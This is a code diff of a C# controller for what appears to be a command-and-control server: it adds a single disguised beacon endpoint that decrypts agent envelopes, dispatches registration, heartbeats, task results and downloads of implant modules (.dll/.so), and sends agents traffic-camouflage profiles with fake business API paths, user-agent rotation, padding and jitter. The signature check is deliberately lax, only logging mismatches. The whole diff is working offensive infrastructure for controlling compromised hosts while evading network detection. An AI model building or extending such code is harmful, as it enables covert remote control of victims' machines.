@@ -3,8 +3,10 @@ using System.Text.Json;
 using Microsoft.AspNetCore.Mvc;
 using Microsoft.Extensions.Options;
 using LibraNextgen.Common.Models;
+using LibraNextgen.Common.Profiles;
 using LibraNextgen.Common.Protocol;
 using LibraNextgen.Service.Configuration;
+using LibraNextgen.Service.Profiles;
 using LibraNextgen.Service.Services;
 
 namespace LibraNextgen.Service.Controllers;
@@ -104,17 +106,7 @@ public class AgentCommsController : ControllerBase
         var sessionToken = _commsService.IssueSessionToken(agent.Id);
 
         var profile = await _commsService.GetActiveProfileAsync();
-        var response = new
-        {
-            agent_id = agent.Id,
-            session_key = sessionKey,
-            session_token = sessionToken,
-            heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
-            result_url = profile.GetResultUrl("/api/beacon"),
-            ws_url = profile.GetWebSocketUrl(""),
-            heartbeat_interval = profile.HeartbeatIntervalSeconds,
-            jitter = profile.JitterPercent
-        };
+        var response = await BuildRegisterResponseAsync(agent, request, sessionKey, sessionToken, profile);
 
         var responseJson = JsonSerializer.Serialize(response);
         var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
@@ -140,6 +132,326 @@ public class AgentCommsController : ControllerBase
             _wsManager.AppendEvent("agent", $"Agent {hostname} ({ipAddress}) 上线");
         }
         catch { /* best-effort */ }
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // 单入口内部路由（流量伪装 Phase 2）
+    //
+    // 所有 beacon 流量经 BeaconEntryMiddleware 重写到本端点：
+    //   POST <entry_path>/<随机业务后缀>
+    //   body = { dataKey: 密文, tsKey: ts, randKey: 随机, signKey: HMAC, tokenKey: sid }
+    // 密文内是 BeaconEnvelope{op, id, data}，按 op 分发：
+    //   reg=注册(预会话密钥) / hb=心跳 / res=结果 / mod=模块下载
+    // ══════════════════════════════════════════════════════════════════
+
+    [HttpPost("handle")]
+    public async Task<IActionResult> Handle([FromBody] JsonElement? body)
+    {
+        if (body is not { } el)
+            return BadRequest(new { error = "invalid body" });
+
+        var profile = await _commsService.GetActiveProfileAsync();
+        var (dataKey, tsKey, randKey, signKey, tokenKey) = TransformKeys(profile);
+
+        // 1) 壳解析
+        if (!el.TryGetProperty(dataKey, out var dProp) || dProp.GetString() is not string cipherB64)
+            return BadRequest(new { error = "bad envelope" });
+        var sid = el.TryGetProperty(tokenKey, out var sidProp) ? sidProp.GetString() : null;
+        var tsStr = el.TryGetProperty(tsKey, out var tsProp) ? tsProp.ToString() : "";
+
+        // 2) 假签名宽松校验（仅记录，不拒绝——避免 secret 更换导致失联）
+        if (!string.IsNullOrEmpty(signKey) && el.TryGetProperty(signKey, out var sigProp) && sigProp.GetString() is string providedSign)
+        {
+            var secret = _beaconSettings.Secret;
+            if (!string.IsNullOrEmpty(secret) && !string.IsNullOrEmpty(tsStr))
+            {
+                var expected = HmacHex(secret, $"{tsStr}|{cipherB64}");
+                if (!string.Equals(expected, providedSign, StringComparison.OrdinalIgnoreCase))
+                {
+                    // HMAC 不匹配：宽松处理（记录）
+                }
+            }
+        }
+
+        // 3) 密钥选择：sid → 会话密钥；否则尝试预会话密钥（注册）
+        byte[]? key = null;
+        string? agentId = null;
+        if (!string.IsNullOrEmpty(sid) &&
+            _commsService.TryResolveSessionToken(sid, out var resolved) &&
+            !string.IsNullOrEmpty(resolved))
+        {
+            agentId = resolved;
+            _commsService.TryGetSessionKey(resolved, out key);
+        }
+
+        string plain;
+        try
+        {
+            if (key != null)
+            {
+                plain = CryptoHelper.DecryptPayload(cipherB64, key);
+            }
+            else if (!string.IsNullOrEmpty(_beaconSettings.Secret))
+            {
+                plain = CryptoHelper.DecryptPayload(cipherB64, CryptoHelper.DerivePreSessionKey(_beaconSettings.Secret));
+            }
+            else
+            {
+                return Unauthorized(new { error = "no key available" });
+            }
+        }
+        catch (Exception)
+        {
+            return Unauthorized(new { error = "decrypt failed" });
+        }
+
+        // 4) 信封解析（camelCase：op/id/data）
+        BeaconEnvelope? env;
+        try
+        {
+            env = JsonSerializer.Deserialize<BeaconEnvelope>(plain, new JsonSerializerOptions
+            {
+                PropertyNameCaseInsensitive = true
+            });
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "bad envelope" });
+        }
+        if (env == null || string.IsNullOrEmpty(env.Op))
+            return BadRequest(new { error = "bad envelope" });
+
+        var bytesReceived = Request.ContentLength ?? 0;
+
+        // 5) 分发
+        switch (env.Op)
+        {
+            case "reg":
+                return await HandleRegAsync(env.Data, profile);
+
+            case "hb":
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                return await HandleHbAsync(agentId, env.Data, key, bytesReceived, profile);
+
+            case "res":
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                return await HandleResAsync(agentId, env.Data, key, bytesReceived, profile);
+
+            case "mod":
+                if (agentId == null || key == null)
+                    return Unauthorized(new { error = "session not established" });
+                return await HandleModAsync(agentId, env.Data, key, profile);
+
+            default:
+                return BadRequest(new { error = "unknown op" });
+        }
+    }
+
+    private async Task<IActionResult> HandleRegAsync(string regData, IMalleableProfile profile)
+    {
+        RegisterRequest? request;
+        try
+        {
+            request = JsonSerializer.Deserialize<RegisterRequest>(regData, new JsonSerializerOptions
+            {
+                PropertyNameCaseInsensitive = true
+            });
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "invalid registration data" });
+        }
+        if (request == null || string.IsNullOrWhiteSpace(request.Hostname))
+            return BadRequest(new { error = "hostname required" });
+
+        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
+            return Unauthorized(new { error = "invalid beacon secret" });
+
+        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
+        var agent = await _commsService.HandleRegisterAsync(request, clientIp);
+        if (agent == null)
+            return StatusCode(500, new { error = "registration failed" });
+
+        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey, request.HasSessionKey);
+        var sessionToken = _commsService.IssueSessionToken(agent.Id);
+
+        var response = await BuildRegisterResponseAsync(agent, request, sessionKey, sessionToken, profile);
+        _ = BroadcastAgentOnlineAsync(agent.Id, agent.Hostname, clientIp);
+        return Ok(response);
+    }
+
+    private async Task<IActionResult> HandleHbAsync(
+        string agentId, string hbData, byte[] key, long bytesReceived, IMalleableProfile profile)
+    {
+        // 重放保护：ts 与当前时间差 > 120s 拒绝
+        try
+        {
+            using var hb = JsonDocument.Parse(hbData);
+            if (hb.RootElement.TryGetProperty("ts", out var ts) && ts.TryGetInt64(out var ms))
+            {
+                var now = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+                if (Math.Abs(now - ms) > 120_000)
+                    return Unauthorized(new { error = "stale heartbeat" });
+            }
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "invalid payload" });
+        }
+
+        var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
+        if (!valid)
+            return NotFound(new { error = "agent not found" });
+
+        var responseJson = JsonSerializer.Serialize(new HeartbeatResponse { PendingTask = task });
+        var encrypted = CryptoHelper.EncryptPayload(responseJson, key);
+        var bytesSent = Encoding.UTF8.GetByteCount(encrypted);
+        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);
+
+        var (dataKey, _, _, _, _) = TransformKeys(profile);
+        return Ok(new Dictionary<string, string> { [dataKey] = encrypted });
+    }
+
+    private async Task<IActionResult> HandleResAsync(
+        string agentId, string resData, byte[] key, long bytesReceived, IMalleableProfile profile)
+    {
+        TaskResult? result;
+        try
+        {
+            result = JsonSerializer.Deserialize<TaskResult>(resData);
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "invalid payload" });
+        }
+        if (result == null)
+            return BadRequest(new { error = "invalid payload" });
+
+        var responseJson = JsonSerializer.Serialize(new { status = "received" });
+        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
+        var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
+        if (!success)
+            return NotFound(new { error = "invalid task" });
+
+        return Ok(new { status = "received" });
+    }
+
+    private async Task<IActionResult> HandleModAsync(
+        string agentId, string modData, byte[] key, IMalleableProfile profile)
+    {
+        string? name = null;
+        try
+        {
+            using var doc = JsonDocument.Parse(modData);
+            if (doc.RootElement.TryGetProperty("name", out var n))
+                name = n.GetString();
+        }
+        catch (JsonException)
+        {
+            return BadRequest(new { error = "invalid payload" });
+        }
+        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
+            return BadRequest(new { error = "invalid module name" });
+
+        var platform = await ResolveAgentPlatformAsync(agentId);
+        if (platform == null)
+            return NotFound(new { error = "agent platform unknown" });
+
+        var modulesDir = Path.Combine(BuildsDir, "modules", platform);
+        var ext = platform.StartsWith("linux") ? "so" : "dll";
+        var modulePath = Path.Combine(modulesDir, $"{name}.{ext}");
+        if (!System.IO.File.Exists(modulePath))
+        {
+            var legacy = Path.Combine(BuildsDir, "modules", $"{name}.{ext}");
+            if (System.IO.File.Exists(legacy))
+                modulePath = legacy;
+        }
+        if (!System.IO.File.Exists(modulePath))
+            return NotFound(new { error = "module not found" });
+
+        var bytes = System.IO.File.ReadAllBytes(modulePath);
+        // 响应壳：密文内容为 base64 的模块二进制
+        var encrypted = CryptoHelper.EncryptPayload(Convert.ToBase64String(bytes), key);
+        var (dataKey, _, _, _, _) = TransformKeys(profile);
+        return Ok(new Dictionary<string, string> { [dataKey] = encrypted });
+    }
+
+    private async Task<object> BuildRegisterResponseAsync(
+        Agent agent, RegisterRequest request, string? sessionKey, string sessionToken, IMalleableProfile profile)
+    {
+        return new
+        {
+            agent_id = agent.Id,
+            session_key = sessionKey,
+            session_token = sessionToken,
+            heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
+            result_url = profile.GetResultUrl("/api/beacon"),
+            ws_url = profile.GetWebSocketUrl(""),
+            heartbeat_interval = profile.HeartbeatIntervalSeconds,
+            jitter = profile.JitterPercent,
+            heartbeat_interval_ms = profile.HeartbeatIntervalSeconds * 1000,
+            jitter_percent = profile.JitterPercent,
+            profile = BuildTransformJson(profile)
+        };
+    }
+
+    private static (string dataKey, string tsKey, string randKey, string signKey, string tokenKey) TransformKeys(
+        IMalleableProfile profile)
+    {
+        if (profile is ConfigurableProfile cp)
+        {
+            var c = cp.Config;
+            return (c.DataKey, c.TsKey, c.RandKey, c.SignKey, c.TokenKey);
+        }
+        return ("d", "ts", "r", "sign", "sid");
+    }
+
+    private static object BuildTransformJson(IMalleableProfile profile)
+    {
+        if (profile is ConfigurableProfile cp)
+        {
+            var c = cp.Config;
+            return new
+            {
+                entryPath = c.EntryPath,
+                pathSuffixes = c.PathSuffixes,
+                dataKey = c.DataKey,
+                tsKey = c.TsKey,
+                randKey = c.RandKey,
+                signKey = c.SignKey,
+                tokenKey = c.TokenKey,
+                userAgents = c.UserAgents,
+                paddingMin = c.PaddingMin,
+                paddingMax = c.PaddingMax,
+                heartbeatIntervalMs = c.HeartbeatIntervalSeconds * 1000,
+                jitterPercent = c.JitterPercent
+            };
+        }
+        // DefaultProfile 固定值
+        return new
+        {
+            entryPath = "/api",
+            pathSuffixes = new[] { "user/info", "orders/list", "profile", "settings", "notifications", "messages/unread" },
+            dataKey = "d",
+            tsKey = "ts",
+            randKey = "r",
+            signKey = "sign",
+            tokenKey = "sid",
+            userAgents = Array.Empty<string>(),
+            paddingMin = 0,
+            paddingMax = 64,
+            heartbeatIntervalMs = 30000,
+            jitterPercent = 0.2
+        };
+    }
+
+    private static string HmacHex(string secret, string msg)
+    {
+        using var hmac = new System.Security.Cryptography.HMACSHA256(Encoding.UTF8.GetBytes(secret));
+        var hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(msg));
+        return Convert.ToHexString(hash).ToLowerInvariant();
     }
 
     [HttpPost("heartbeat")]
@@ -414,4 +726,15 @@ public class CoreKeyRequest
     public string BuildId { get; set; } = string.Empty;
     public string PublicKey { get; set; } = string.Empty;
     public string? BeaconSecret { get; set; }
+}
+
+/// <summary>密文内部的路由信封（单入口模式）：op 决定服务端分发。</summary>
+public class BeaconEnvelope
+{
+    /// <summary>reg=注册 / hb=心跳 / res=结果 / mod=模块下载</summary>
+    public string Op { get; set; } = string.Empty;
+    /// <summary>会话 token（reg 时为注册数据）</summary>
+    public string Id { get; set; } = string.Empty;
+    /// <summary>业务数据（JSON 字符串）</summary>
+    public string Data { get; set; } = string.Empty;
 }
